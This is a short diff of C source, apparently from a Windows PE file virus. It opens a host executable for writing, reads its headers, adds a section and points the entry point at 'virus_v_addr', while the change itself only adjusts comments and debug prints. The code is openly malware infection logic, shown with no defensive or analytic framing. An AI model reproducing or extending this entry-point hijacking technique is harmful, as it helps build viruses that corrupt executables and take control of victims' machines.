@@ -28,7 +28,7 @@ int main(int argc, char* argv[])
 
     FILE *host = fopen(EXE_FILE_NAME, "rb+");
 
-// get nt_header to write back
+// get nt_header
     IMAGE_DOS_HEADER i_dos_header = {0};
     fread(&i_dos_header, 1, sizeof(i_dos_header), host);
     IMAGE_NT_HEADERS i_nt_headers = {0};
@@ -92,9 +92,9 @@ int main(int argc, char* argv[])
 
 
 // Updating nt_headers
-    DWORD OriginalEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
-    printf("OriginalEntryPoint: %X\n", OriginalEntryPoint);
-    printf("virus_v_addr: %X\n", virus_v_addr);
+    // DWORD OriginalEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
+    // printf("OriginalEntryPoint: %X\n", OriginalEntryPoint);
+    // printf("virus_v_addr: %X\n", virus_v_addr);
 
     i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
     i_nt_headers.FileHeader.NumberOfSections++;
